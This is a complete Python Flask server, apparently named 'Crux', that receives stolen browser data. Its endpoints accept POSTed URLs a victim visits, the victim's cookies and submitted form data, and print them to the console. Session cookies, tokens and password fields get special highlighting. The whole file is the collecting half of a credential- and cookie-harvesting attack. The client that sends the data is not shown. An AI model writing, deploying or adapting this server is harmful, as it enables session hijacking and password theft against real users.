from flask import Flask, request
import json
import logging
from rich import print as rprint

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Hello from Crux!</p>"

@app.route("/u", methods=["POST"])
def get_url():
    if request.json:
        url = request.json["url"]
        rprint(f"[blue][+] URL: {url}[/blue]")
    return "Thanks!"

@app.route("/c", methods=["POST"])
def get_cookie():
    if request.json:
        cookie = request.json["cookie"]
        # Special styling for any session cookies
        if "sess" in cookie["name"].lower() or "token" in cookie["name"].lower() or cookie["session"]:
            style = "[white on yellow]"
            style_close = "[/white on yellow]"
        else:
            style = "[yellow]"
            style_close = "[/yellow]"
        rprint(f"{style}[+] Cookie: {cookie}{style_close}")
    return "Thanks!"

@app.route("/f", methods=["POST"])
def get_form_data():
    if request.json:
        data = request.json["data"]
        # Special styling for any passwords
        if any(["pass" in k.lower() for k in data]):
            style = "[white on red]"
            style_close = "[/white on red]"
        else:
            style = "[red]"
            style_close = "[/red]"
        rprint(f"{style}[+] Form Data: {data}{style_close}")
    return "Thanks!"